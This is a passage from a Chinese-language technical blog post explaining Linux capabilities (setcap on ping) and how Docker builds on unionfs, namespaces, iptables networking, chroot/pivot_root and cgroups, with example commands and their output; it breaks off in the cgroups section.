+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ setcap &#x27;cap_net_raw+p&#x27; builddir/ping/ping</span><br><span class="line">unable to set CAP_SETFCAP effective capability: Operation not permitted</span><br><span class="line"></span><br><span class="line">$ sudo setcap &#x27;cap_net_raw+p&#x27; builddir/ping/ping</span><br><span class="line"></span><br><span class="line">$ getcap builddir/ping/ping</span><br><span class="line">builddir/ping/ping = cap_net_raw+p</span><br><span class="line"></span><br><span class="line">$ builddir/ping/ping www.baidu.com -c 1</span><br><span class="line">PING www.a.shifen.com (180.101.49.12) 56(84) bytes of data.</span><br><span class="line">64 bytes from 180.101.49.12 (180.101.49.12): icmp_seq=1 ttl=53 time=10.0 ms</span><br><span class="line"></span><br><span class="line">--- www.a.shifen.com ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 10.028/10.028/10.028/0.000 ms</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里再活学活用一下，为什么普通用户无法执行 `setcap` 呢？因为执行 `setcap` 的用户需要在 `effective` 集合中包含 `CAP_SETFCAP` capabilities，而普通用户不具备这个 capabilities，所以必须使用 root 用户。</span><br></pre></td></tr></table></figure>
+<p>其实 ping 在执行过程中会将 Permitted 集合中的  <code>CAP_NET_RAW</code>  capabilities 加入  <code>Effective</code>  集合中，打开 Socket 之后再将该 capabilities 从  <code>Effective</code>  集合中移除，所以  <code>grep</code>  是看不到的。其中这就是我在 <span class="exturl" data-url="aHR0cHM6Ly9pY2xvdWRuYXRpdmUuaW8vcG9zdHMvbGludXgtY2FwYWJpbGl0aWVzLXdoeS10aGV5LWV4aXN0LWFuZC1ob3ctdGhleS13b3JrLyNzcGFuLWlkaW5saW5lLXRvYzRzcGFuLSVFNyVBRSU4MCVFNSU4RCU5NSVFNyVBNCVCQSVFNCVCRSU4Qg==">第一篇文章</span>提到的 ping 文件具有 <strong>capabilities 感知能力</strong>。可以通过  <code>stace</code>  跟踪系统调用来验证：</p>
+<p>如果 ping 二进制文件不具备 <strong>capabilities 感知能力</strong>，即没有调用 capset 和 capget 的权限，我们就必须要开启  <code>Effective</code>  标志位（F (Effective)），这样就会将该 capabilities 自动添加到进程的  <code>Effective</code>  集合中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">setcap</span> <span class="string">&#x27;cap_net_raw+ep&#x27;</span> builddir/ping/ping</span><br></pre></td></tr></table></figure>
+<h2 id="docker"><a class="markdownIt-Anchor" href="#docker">#</a> docker</h2>
+<p>Linux 命名空间、控制组和 UnionFS 三大技术支撑了目前 Docker 的实现</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810002405727.png" alt="image-20230810002405727"></p>
+<blockquote>
+<ul>
+<li>namespace，命名空间</li>
+</ul>
+<p>命名空间，容器隔离的基础，保证 A 容器看不到 B 容器.<br>
+6 个命名空间：User，Mnt，Network，UTS，IPC，Pid</p>
+<ul>
+<li>cgroups，Cgroups 是 Control Group 的缩写，控制组</li>
+</ul>
+<p>cgroups 容器资源统计和隔离</p>
+<p>主要用到的 cgroups 子系统：cpu，blkio，device，freezer，memory</p>
+<p>实际上 Docker 是使用了很多 Linux 的隔离功能，让容器看起来像一个轻量级虚拟机在独立运行，容器的本质是被限制了的 Namespaces，cgroup，具有逻辑上独立文件系统，网络的一个进程。</p>
+<ul>
+<li>unionfs 联合文件系统</li>
+</ul>
+<p>典型：aufs/overlayfs，分层镜像实现的基础</p>
+</blockquote>
+<h3 id="unionfs"><a class="markdownIt-Anchor" href="#unionfs">#</a> unionfs</h3>
+<p>Docker Image 是有一个层级结构的，最底层的 Layer 为 BaseImage（一般为一个操作系统的 ISO 镜像），然后顺序执行每一条指令，生成的 Layer 按照入栈的顺序逐渐累加，最终形成一个 Image。</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810002725400.png" alt="image-20230810002725400" style="zoom:67%;" /> 
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810002824372.png" alt="image-20230810002824372" style="zoom:67%;" /> 
+<p>简单来说，一个 Image 是通过一个 DockerFile 定义的，然后使用 docker build 命令构建它。</p>
+<p>DockerFile 中的每一条命令的执行结果都会成为 Image 中的一个 Layer。</p>
+<p>这里，我们通过 Build 一个镜像，来观察 Image 的分层机制：</p>
+<p>Dockerfile:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># Use an official Python runtime as a parent image</span><br><span class="line">FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line"># Set the working directory to /app</span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># Copy the current directory contents into the container at /app</span><br><span class="line">COPY . /app</span><br><span class="line"></span><br><span class="line"># Install any needed packages specified in requirements.txt</span><br><span class="line">RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line"># Make port 80 available to the world outside this container</span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line"># Define environment variable</span><br><span class="line">ENV NAME World</span><br><span class="line"></span><br><span class="line"># Run app.py when the container launches</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure>
+<p>构建结果：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@rds-k8s<span class="number">-18</span>-svr0:~/xuran/exampleimage<span class="meta"># docker build -t hello ./</span></span><br><span class="line">Sending build context to Docker daemon  <span class="number">5.12</span> kB</span><br><span class="line">Step <span class="number">1</span>/<span class="number">7</span> : FROM python:<span class="number">2.7</span>-slim</span><br><span class="line"> ---&gt; <span class="number">804b</span>0a01ea83</span><br><span class="line">Step <span class="number">2</span>/<span class="number">7</span> : WORKDIR /app</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; <span class="number">6</span>d93c5b91703</span><br><span class="line">Step <span class="number">3</span>/<span class="number">7</span> : COPY . /app</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; feddc82d321b</span><br><span class="line">Step <span class="number">4</span>/<span class="number">7</span> : RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; <span class="number">94695</span>df5e14d</span><br><span class="line">Step <span class="number">5</span>/<span class="number">7</span> : EXPOSE <span class="number">81</span></span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; <span class="number">43</span>c392d51dff</span><br><span class="line">Step <span class="number">6</span>/<span class="number">7</span> : ENV NAME World</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; <span class="number">78</span>c9a60237c8</span><br><span class="line">Step <span class="number">7</span>/<span class="number">7</span> : CMD python app.py</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; a5ccd4e1b15d</span><br><span class="line">Successfully built a5ccd4e1b15d</span><br></pre></td></tr></table></figure>
+<p>构建的过程就是执行 Dockerfile 文件中我们写入的命令。构建一共进行了 7 个步骤，每个步骤进行完都会生成一个随机的 ID，来标识这一 layer 中的内容。 最后一行的 a5ccd4e1b15d 为镜像的 ID。</p>
+<p>如果 DockerFile 中的内容没有变动，那么相应的镜像在 build 的时候会复用之前的 layer，以便提升构建效率。并且，即使文件内容有修改，那也只会重新 build 修改的 layer，其他未修改的也仍然会复用。</p>
+<p>Docker 也正是通过 AUFS 来管理 Images 的。</p>
+<h3 id="namespace"><a class="markdownIt-Anchor" href="#namespace">#</a> namespace</h3>
+<p>在 Linux 系统中，Namespace 是在内核级别以一种抽象的形式来封装系统资源，通过将系统资源放在不同的 Namespace 中，来实现资源隔离的目的。不同的 Namespace 程序，可以享有一份独立的系统资源。</p>
+<p>命名空间（namespaces）是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。</p>
+<p>Linux 的命名空间机制提供了以下七种不同的命名空间，包括 :</p>
+<ul>
+<li>CLONE_NEWCGROUP、</li>
+<li>CLONE_NEWIPC、</li>
+<li>CLONE_NEWNET、</li>
+<li>CLONE_NEWNS、</li>
+<li>CLONE_NEWPID、</li>
+<li>CLONE_NEWUSER</li>
+<li>CLONE_NEWUTS</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>Namespace</strong></th>
+<th style="text-align:center"><strong>Flag</strong></th>
+<th style="text-align:center"><strong>Page</strong></th>
+<th style="text-align:center"><strong>Isolates</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Cgroup</td>
+<td style="text-align:center"><strong>CLONE_NEWCGROUP</strong></td>
+<td style="text-align:center"><strong>cgroup_namespaces</strong></td>
+<td style="text-align:center">Cgroup root directory</td>
+</tr>
+<tr>
+<td style="text-align:center">IPC</td>
+<td style="text-align:center"><strong>CLONE_NEWIPC</strong></td>
+<td style="text-align:center"><strong>ipc_namespaces</strong></td>
+<td style="text-align:center">System V IPC,POSIX message queues 隔离进程间通信</td>
+</tr>
+<tr>
+<td style="text-align:center">Network</td>
+<td style="text-align:center"><strong>CLONE_NEWNET</strong></td>
+<td style="text-align:center"><strong>network_namespaces</strong></td>
+<td style="text-align:center">Network devices,stacks, ports, etc. 隔离网络资源</td>
+</tr>
+<tr>
+<td style="text-align:center">Mount</td>
+<td style="text-align:center"><strong>CLONE_NEWNS</strong></td>
+<td style="text-align:center"><strong>mount_namespaces</strong></td>
+<td style="text-align:center">Mount points 隔离文件系统挂载点</td>
+</tr>
+<tr>
+<td style="text-align:center">PID</td>
+<td style="text-align:center"><strong>CLONE_NEWPID</strong></td>
+<td style="text-align:center"><strong>pid_namespaces</strong></td>
+<td style="text-align:center">Process IDs 隔离进程的 ID</td>
+</tr>
+<tr>
+<td style="text-align:center">Time</td>
+<td style="text-align:center"><strong>CLONE_NEWTIME</strong></td>
+<td style="text-align:center"><strong>time_namespaces</strong></td>
+<td style="text-align:center">Boot and monotonic clocks</td>
+</tr>
+<tr>
+<td style="text-align:center">User</td>
+<td style="text-align:center"><strong>CLONE_NEWUSER</strong></td>
+<td style="text-align:center"><strong>user_namespaces</strong></td>
+<td style="text-align:center">User and group IDs 隔离用户和用户组的 ID</td>
+</tr>
+<tr>
+<td style="text-align:center">UTS</td>
+<td style="text-align:center"><strong>CLONE_NEWUTS</strong></td>
+<td style="text-align:center"><strong>uts_namespaces</strong></td>
+<td style="text-align:center">Hostname and NIS domain name 隔离主机名和域名信息</td>
+</tr>
+</tbody>
+</table>
+<h4 id="pid隔离"><a class="markdownIt-Anchor" href="#pid隔离">#</a> PID 隔离</h4>
+<p>PID Namespaces，它其实是 Linux 创建新进程时的一个可选参数，在 Linux 系统中创建进程的系统调用是 clone () 方法。</p>
+<p>通过调用这个方法，这个进程会获得一个独立的进程空间，它的 pid 是 1，并且看不到宿主机上的其他进程，这也就是在容器内执行 PS 命令的结果。</p>
+<p>在子进程的 shell 中执行了 ps aux/top 之类的命令，发现还是可以看到所有父进程的 PID，那是因为我们还没有对文件系统进行隔离，ps/top 之类的命令调用的是真实系统下的 /proc 文件内容，看到的自然是所有的进程。</p>
+<p>此外，与其他的 namespace 不同的是，为了实现一个稳定安全的容器，PID namespace 还需要进行一些额外的工作才能确保其中的进程运行顺利。</p>
+<p>进程是 Linux 以及现在操作系统中非常重要的概念，它表示一个正在执行的程序，也是在现代分时系统中的一个任务单元。</p>
+<p>在每一个 *nix 的操作系统上，我们都能够通过 ps 命令打印出当前操作系统中正在执行的进程</p>
+<p>当前机器上有很多的进程正在执行，在上述进程中有两个非常特殊，一个是 pid 为 1 的 /sbin/init 进程，另一个是 pid 为 2 的 kthreadd 进程，这两个进程都是被 Linux 中的上帝进程 idle 创建出来的，其中前者负责执行内核的一部分初始化工作和系统配置，也会创建一些类似 getty 的注册进程，而后者负责管理和调度其他的内核进程。</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810005208230.png" alt="image-20230810005208230" style="zoom:67%;" /> 
+<p>如果我们在当前的 Linux 操作系统下运行一个新的 Docker 容器，并通过 exec 进入其内部的 bash 并打印其中的全部进程，我们会得到以下的结果：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UID        PID  PPID  C STIME TTY          TIME <span class="keyword">CMD</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">root     29407     1  0 Nov16 ?        00:08:38 /usr/bin/dockerd --raw-logs</span></span><br><span class="line">root      <span class="number">1554</span> <span class="number">29407</span>  <span class="number">0</span> Nov19 ?        <span class="number">00</span>:<span class="number">03</span>:<span class="number">28</span> docker-containerd -l unix:///var/<span class="keyword">run</span><span class="language-bash">/docker/libcontainerd/docker-containerd.sock --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --shim docker-containerd-shim --runtime docker-runc</span></span><br><span class="line">root      <span class="number">5006</span>  <span class="number">1554</span>  <span class="number">0</span> <span class="number">08</span>:<span class="number">38</span> ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> docker-containerd-shim b809a2eb3630e64c581561b08ac46154878ff1c61c6519848b4a29d412215e79 /var/<span class="keyword">run</span><span class="language-bash">/docker/libcontainerd/b809a2eb3630e64c581561b08ac46154878ff1c61c6519848b4a29d412215e79 docker-runc</span></span><br></pre></td></tr></table></figure>
+<p>在新的容器内部执行 ps 命令打印出了非常干净的进程列表，只有包含当前 ps -ef 在内的三个进程，在宿主机器上的几十个进程都已经消失不见了。</p>
+<p>当前的 Docker 容器成功将容器内的进程与宿主机器中的进程隔离，如果我们在宿主机器上打印当前的全部进程时，会得到下面三条与 Docker 相关的结果：</p>
+<p>在当前的宿主机器上，可能就存在由上述的不同进程构成的进程树：</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810005242675.png" alt="image-20230810005242675"></p>
+<p>实际上，docker 容器的 pid 隔离，就是在使用 clone (2) 创建新进程时传入 CLONE_NEWPID 实现的，也就是使用 Linux 的命名空间实现进程的隔离，Docker 容器内部的任意进程都对宿主机器的进程一无所知。</p>
+<p>Docker 的容器就是使用上述技术实现与宿主机器的进程隔离，当我们每次运行 docker run 或者 docker start 时，都会在下面的方法中创建一个用于设置进程间隔离的 Spec：</p>
+<p>在 setNamespaces 方法中不仅会设置进程相关的命名空间，还会设置与用户、网络、IPC 以及 UTS 相关的命名空间：</p>
+<p>PID namespace 隔离非常实用，它对进程 PID 重新标号，即两个不同 namespace 下的进程可以有同一个 PID。<br>
+每个 PID namespace 都有自己的计数程序。内核为所有的 PID namespace 维护了一个树状结构，最顶层的是系统初始时创建的，我们称之为 root namespace。他创建的新 PID namespace 就称之为 child namespace（树的子节点），而原先的 PID namespace 就是新创建的 PID namespace 的 parent namespace（树的父节点）。<br>
+通过这种方式，不同的 PID namespaces 会形成一个等级体系。所属的父节点可以看到子节点中的进程，并可以通过信号等方式对子节点中的进程产生影响。反过来，子节点不能看到父节点 PID namespace 中的任何内容。由此产生如下结论</p>
+<ul>
+<li>每个 PID namespace 中的第一个进程 “PID 1“，都会像传统 Linux 中的 init 进程一样拥有特权，起特殊作用。</li>
+<li>一个 namespace 中的进程，不可能通过 kill 或 ptrace 影响父节点或者兄弟节点中的进程，因为其他节点的 PID 在这个 namespace 中没有任何意义。</li>
+<li>如果你在新的 PID namespace 中重新挂载 /proc 文件系统，会发现其下只显示同属一个 PID namespace 中的其他进程。</li>
+<li>在 root namespace 中可以看到所有的进程，并且递归包含所有子节点中的进程。</li>
+</ul>
+<p>不仅仅是 PID，当你启动启动容器之后，Docker 会为这个容器创建一系列其他 namespaces。</p>
+<p>这些 namespaces 提供了不同层面的隔离。容器的运行受到各个层面 namespace 的限制。</p>
+<p>Docker Engine 使用了以下 Linux 的隔离技术:</p>
+<p>The pid namespace: 管理 PID 命名空间 (PID: Process ID).</p>
+<p>The net namespace: 管理网络命名空间 (NET: Networking).</p>
+<p>The ipc namespace: 管理进程间通信命名空间 (IPC: InterProcess Communication).</p>
+<p>The mnt namespace: 管理文件系统挂载点命名空间 (MNT: Mount).</p>
+<p>The uts namespace: Unix 时间系统隔离. (UTS: Unix Timesharing System).</p>
+<p>通过这些技术，运行时的容器得以看到一个和宿主机上其他容器隔离的环境。</p>
+<h3 id="网络隔离"><a class="markdownIt-Anchor" href="#网络隔离">#</a> 网络隔离</h3>
+<p>如果 Docker 的容器通过 Linux 的命名空间完成了与宿主机进程的网络隔离，但是却有没有办法通过宿主机的网络与整个互联网相连，就会产生很多限制。</p>
+<p>所以 Docker 虽然可以通过命名空间创建一个隔离的网络环境，但是 Docker 中的服务仍然需要与外界相连才能发挥作用。<br>
+每一个使用 docker run 启动的容器其实都具有单独的网络命名空间，Docker 为我们提供了四种不同的网络模式，Host、Container、None 和 Bridge 模式。</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810005511766.png" alt="image-20230810005511766"></p>
+<p>当 Docker 服务器在主机上启动之后会创建新的虚拟网桥 docker0，随后在该主机上启动的全部服务在默认情况下都与该网桥相连。</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810005600173.png" alt="image-20230810005600173" style="zoom: 67%;" /> 
+<p>在默认情况下，每一个容器在创建时都会创建一对虚拟网卡，两个虚拟网卡组成了数据的通道，其中一个会放在创建的容器中，会加入到名为 docker0 网桥中。</p>
+<p>我们可以使用如下的命令来查看当前网桥的接口：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brctl </span><span class="keyword">show</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">bridge </span>name <span class="keyword">bridge </span>id       STP enabled interfaces</span><br><span class="line">docker0     <span class="number">8000</span>.<span class="number">0242</span>a6654980   no      veth3e84d<span class="symbol">4f</span></span><br><span class="line"> veth<span class="symbol">9953b</span>75</span><br></pre></td></tr></table></figure>
+<p>docker0 会为每一个容器分配一个新的 IP 地址并将 docker0 的 IP 地址设置为默认的网关。</p>
+<p>网桥 docker0 通过 iptables 中的配置与宿主机器上的网卡相连，所有符合条件的请求都会通过 iptables 转发到 docker0 并由网桥分发给对应的机器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -t nat -L</span><br><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">DOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL</span><br><span class="line"></span><br><span class="line">Chain DOCKER (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">RETURN     all  --  anywhere             anywhere</span><br></pre></td></tr></table></figure>
+<p>我们在当前的机器上使用 docker run -d -p 6379:6379 redis 命令启动了一个新的 Redis 容器，在这之后我们再查看当前 iptables 的 NAT 配置就会看到在 DOCKER 的链中出现了一条新的规则：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNAT       tcp  <span class="comment">--  anywhere             anywhere             tcp dpt:6379 to:192.168.0.4:6379</span></span><br></pre></td></tr></table></figure>
+<p>上述规则会将从任意源发送到当前机器 6379 端口的 TCP 包转发到 192.168.0.4:6379 所在的地址上。</p>
+<p>这个地址其实也是 Docker 为 Redis 服务分配的 IP 地址，如果我们在当前机器上直接 ping 这个 IP 地址就会发现它是可以访问到的：</p>
+<p>当有 Docker 的容器需要将服务暴露给宿主机器，就会为容器分配一个 IP 地址，同时向 iptables 中追加一条新的规则。</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810005955115.png" alt="image-20230810005955115" style="zoom:67%;" /> 
+<p>当我们使用 redis-cli 在宿主机器的命令行中访问 127.0.0.1:6379 的地址时，经过 iptables 的 NAT PREROUTING 将 ip 地址定向到了 192.168.0.4，重定向过的数据包就可以通过 iptables 中的 FILTER 配置，最终在 NAT POSTROUTING 阶段将 ip 地址伪装成 127.0.0.1，到这里虽然从外面看起来我们请求的是 127.0.0.1:6379，但是实际上请求的已经是 Docker 容器暴露出的端口了。</p>
+<p>Docker 通过 Linux 的命名空间实现了网络的隔离，又通过 iptables 进行数据包转发，让 Docker 容器能够优雅地为宿主机器或者其他容器提供服务。</p>
+<h3 id="libnetwork"><a class="markdownIt-Anchor" href="#libnetwork">#</a> Libnetwork</h3>
+<p>整个网络部分的功能都是通过 Docker 拆分出来的 libnetwork 实现的，它提供了一个连接不同容器的实现，同时也能够为应用给出一个能够提供一致的编程接口和网络层抽象的容器网络模型。</p>
+<p>libnetwork 中最重要的概念，容器网络模型由以下的几个主要组件组成，分别是 Sandbox、Endpoint 和 Network：</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810010336926.png" alt="image-20230810010336926"></p>
+<p>在容器网络模型中，每一个容器内部都包含一个 Sandbox，其中存储着当前容器的网络栈配置，包括容器的接口、路由表和 DNS 设置，Linux 使用网络命名空间实现这个 Sandbox，每一个 Sandbox 中都可能会有一个或多个 Endpoint，在 Linux 上就是一个虚拟的网卡 veth，Sandbox 通过 Endpoint 加入到对应的网络中，这里的网络可能就是我们在上面提到的 Linux 网桥或者 VLAN。</p>
+<h3 id="挂载点"><a class="markdownIt-Anchor" href="#挂载点">#</a> 挂载点</h3>
+<p>在新的进程中创建隔离的挂载点命名空间需要在 clone 函数中传入 CLONE_NEWNS，这样子进程就能得到父进程挂载点的拷贝，如果不传入这个参数子进程对文件系统的读写都会同步回父进程以及整个主机的文件系统。</p>
+<p>如果一个容器需要启动，那么它一定需要提供一个根文件系统（rootfs），容器需要使用这个文件系统来创建一个新的进程，所有二进制的执行都必须在这个根文件系统中。</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810010545993.png" alt="image-20230810010545993"></p>
+<p>想要正常启动一个容器就需要在 rootfs 中挂载以上的几个特定的目录，除了上述的几个目录需要挂载之外我们还需要建立一些符号链接保证系统 IO 不会出现问题。</p>
+<p>为了保证当前的容器进程没有办法访问宿主机器上其他目录，我们在这里还需要通过 libcotainer 提供的 pivor_root 或者 chroot 函数改变进程能够访问个文件目录的根节点。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// pivor_root</span><br><span class="line">put_old = mkdir(...)<span class="comment">;</span></span><br><span class="line">pivot_root(<span class="name">rootfs</span>, put_old)<span class="comment">;</span></span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>)<span class="comment">;</span></span><br><span class="line">unmount(<span class="name">put_old</span>, MS_DETACH)<span class="comment">;</span></span><br><span class="line">rmdir(<span class="name">put_old</span>)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// chroot</span><br><span class="line">mount(<span class="name">rootfs</span>, <span class="string">&quot;/&quot;</span>, NULL, MS_MOVE, NULL)<span class="comment">;</span></span><br><span class="line">chroot(<span class="string">&quot;.&quot;</span>)<span class="comment">;</span></span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>到这里我们就将容器需要的目录挂载到了容器中，同时也禁止当前的容器进程访问宿主机器上的其他目录，保证了不同文件系统的隔离。</p>
+<p>在 Linux 系统中，系统默认的目录就都是以 / 也就是根目录开头的，chroot 的使用能够改变当前的系统根目录结构，通过改变当前系统的根目录，我们能够限制用户的权利，在新的根目录下并不能够访问旧系统根目录的结构个文件，也就建立了一个与原系统完全隔离的目录结构。</p>
+<h3 id="cgroups"><a class="markdownIt-Anchor" href="#cgroups">#</a> cgroups</h3>
+<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810010943846.png" alt="image-20230810010943846"></p>
+<p>如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。</p>
+<p>每一个 CGroup 都是一组被相同的标准和参数限制的进程，不同的 CGroup 之间是有层级关系的，也就是说它们之间可以从父类继承一些用于限制资源使用的标准和参数。<br>
+Linux 的 CGroup 能够为一组进程分配资源，也就是我们在上面提到的 CPU、内存、网络带宽等资源，通过对资源的分配。<br>
+Linux 使用文件系统来实现 CGroup，我们可以直接使用下面的命令查看当前的 CGroup 中有哪些子系统：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ lssubsys -m</span><br><span class="line">cpuset /sys/fs/cgroup/cpuset</span><br><span class="line">cpu /sys/fs/cgroup/cpu</span><br><span class="line">cpuacct /sys/fs/cgroup/cpuacct</span><br><span class="line">memory /sys/fs/cgroup/memory</span><br><span class="line">devices /sys/fs/cgroup/devices</span><br><span class="line">freezer /sys/fs/cgroup/freezer</span><br><span class="line">blkio /sys/fs/cgroup/blkio</span><br><span class="line">perf_event /sys/fs/cgroup/perf_event</span><br><span class="line">hugetlb /sys/fs/cgroup/hugetlb </span><br></pre></td></tr></table></figure>
+<p>如果我们想要创建一个新的 cgroup 只需要在想要分配或者限制资源的子系统下面创建一个新的文件夹，然后这个文件夹下就会自动出现很多的内容，如果你在 Linux 上安装了 Docker，你就会发现所有子系统的目录下都有一个名为 Docker 的文件夹：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> cpu</span></span><br><span class="line">cgroup.clone_children  </span><br><span class="line">...</span><br><span class="line">cpu.stat  </span><br><span class="line">docker  </span><br><span class="line">notify_on_release </span><br><span class="line">release_agent </span><br><span class="line">tasks</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> cpu/docker/</span></span><br><span class="line">9c3057f1291b53fd54a3d12023d2644efe6a7db6ddf330436ae73ac92d401cf1 </span><br><span class="line">cgroup.clone_children  </span><br><span class="line">...</span><br><span class="line">cpu.stat  </span><br><span class="line">notify_on_release </span><br><span class="line">release_agent </span><br><span class="line">tasks</span><br></pre></td></tr></table></figure>
+<p>9c3057xxx 其实就是我们运行的一个 Docker 容器，启动这个容器时，Docker 会为这个容器创建一个与容器标识符相同的 CGroup，在当前的主机上 CGroup 就会有以下的层级关系：</p>
